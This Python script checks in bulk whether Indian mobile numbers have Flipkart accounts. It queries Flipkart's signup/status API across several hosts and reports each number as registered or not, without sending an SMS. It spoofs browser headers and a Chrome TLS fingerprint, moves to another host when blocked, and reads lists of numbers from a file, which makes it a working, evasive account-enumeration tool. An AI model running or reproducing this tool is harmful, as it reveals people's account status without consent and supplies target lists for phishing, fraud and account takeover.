#!/usr/bin/env python3
"""
Flipkart silent registration checker (no SMS).
Endpoint: POST /api/6/user/signup/status
  GUEST    → NOT_REGISTERED
  VERIFIED → REGISTERED
"""

from __future__ import annotations

import json
import sys
import time
from typing import Any

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import requests

# Optional: better TLS fingerprint
try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# ------------------------------------------------------------
# Config
# ------------------------------------------------------------
ENDPOINTS = [
    "https://1.rome.api.flipkart.com/api/6/user/signup/status",
    "https://2.rome.api.flipkart.com/api/6/user/signup/status",
    "https://www.flipkart.com/api/6/user/signup/status",
]

BASE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": "*/*",
    "Accept-Language": "en-IN,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": "https://www.flipkart.com",
    "Referer": "https://www.flipkart.com/",
    "X-User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/131.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop"
    ),
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
}

TIMEOUT = 15
BULK_DELAY = 0.4  # seconds between numbers


# ------------------------------------------------------------
# Helpers
# ------------------------------------------------------------
def normalize_mobile(mobile: str) -> str:
    digits = "".join(c for c in str(mobile) if c.isdigit())
    if len(digits) >= 10:
        return digits[-10:]
    return digits


def e164(mobile: str) -> str:
    m = normalize_mobile(mobile)
    return f"+91{m}"


def pretty_print(result: dict) -> None:
    status = result.get("status", "UNKNOWN")
    mobile = result.get("mobile", "")
    if status == "REGISTERED":
        print("❰ ✅ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗙𝗢𝗨𝗡𝗗 🎯 ❱")
        print("┏━━━━━━━━━━━━━━━━━━━━┓")
        print("✓ sᴛᴀᴛᴜs ʀᴇɢɪsᴛᴇʀᴇᴅ")
        print("🎯 ᴘʟᴀᴛғᴏʀᴍ 🛍 ғʟɪᴘᴋᴀʀᴛ")
        print(f"📱 ɴᴜᴍʙᴇʀ {mobile}")
        print("┗━━━━━━━━━━━━━━━━━━━━┛")
        print("🎯 Active Flipkart account detected.")
    elif status == "NOT_REGISTERED":
        print("❰ ❌ 𝗡𝗢𝗧 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 ❱")
        print("┏━━━━━━━━━━━━━━━━━━━━┓")
        print("✗ sᴛᴀᴛᴜs ᴜɴʀᴇɢɪsᴛᴇʀᴇᴅ")
        print("🎯 ᴘʟᴀᴛғᴏʀᴍ 🛍 ғʟɪᴘᴋᴀʀᴛ")
        print(f"📱 ɴᴜᴍʙᴇʀ {mobile}")
        print("┗━━━━━━━━━━━━━━━━━━━━┛")
        print("✅ No active Flipkart account on this number.")
    else:
        print(f"Result: {result}")


def _post(url: str, payload: dict) -> tuple[int, Any]:
    if HAS_CFFI:
        r = cffi_requests.post(
            url,
            headers=BASE_HEADERS,
            json=payload,
            timeout=TIMEOUT,
            impersonate="chrome131",
        )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text

    r = requests.post(url, headers=BASE_HEADERS, json=payload, timeout=TIMEOUT)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text


def decide(login_id: str, data: Any) -> str | None:
    """
    Parse Flipkart signup/status response.
    Expected shape:
      {
        "RESPONSE": {
          "userDetails": {
            "+9198xxxxxxxx": "GUEST" | "VERIFIED" | ...
          }
        }
      }
    """
    if not isinstance(data, dict):
        return None

    resp = data.get("RESPONSE") or data.get("response") or data
    if not isinstance(resp, dict):
        return None

    details = resp.get("userDetails") or resp.get("user_details") or {}
    if not isinstance(details, dict):
        return None

    state = (
        details.get(login_id)
        or details.get(login_id.replace("+91", ""))
        or details.get(login_id.lstrip("+"))
    )
    if state is None and len(details) == 1:
        state = next(iter(details.values()))

    if not state:
        return None

    state = str(state).strip().upper()

    # Unregistered
    if state in ("NOT_FOUND", "GUEST", "NEW", "NOT_REGISTERED", "FALSE", "UNREGISTERED"):
        return "NOT_REGISTERED"

    # Registered
    if state in ("VERIFIED", "EXISTING", "REGISTERED", "TRUE", "ACTIVE"):
        return "REGISTERED"

    return None 

def check_flipkart(mobile: str) -> dict:
    m10 = normalize_mobile(mobile)
    if len(m10) != 10 or m10[0] not in "6789":
        return {
            "status": "ERROR",
            "mobile": mobile,
            "error": "Invalid 10-digit Indian mobile",
        }

    login_id = e164(m10)
    payload = {"loginId": [login_id], "supportAllStates": True}
    last_raw = None
    last_http = None

    for url in ENDPOINTS:
        try:
            http, data = _post(url, payload)
            last_http, last_raw = http, data
            if http == 429:
                return {
                    "status": "RATE_LIMIT",
                    "mobile": m10,
                    "http": http,
                    "raw": data,
                }
            if http in (403, 401, 503):
                continue  # try next host
            status = decide(login_id, data)
            if status:
                return {
                    "status": status,
                    "mobile": m10,
                    "http": http,
                    "loginId": login_id,
                    "raw": data,
                }
        except Exception as e:
            last_raw = str(e)
            continue

    return {
        "status": "UNKNOWN",
        "mobile": m10,
        "http": last_http,
        "raw": last_raw,
    }


# ------------------------------------------------------------
# CLI
# ------------------------------------------------------------
def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: python flipkart_check.py <10-digit> [more numbers...]")
        print("       python flipkart_check.py numbers.txt")
        sys.exit(1)

    args = sys.argv[1:]
    numbers: list[str] = []

    if len(args) == 1 and args[0].endswith(".txt"):
        with open(args[0], encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    numbers.append(line)
    else:
        numbers = args

    total = len(numbers)
    for i, num in enumerate(numbers, 1):
        print(f"[{i}/{total}] {normalize_mobile(num)} ... ", end="", flush=True)
        result = check_flipkart(num)
        print(result.get("status", "UNKNOWN"))
        pretty_print(result)
        if i < total:
            time.sleep(BULK_DELAY)


if __name__ == "__main__":
    main()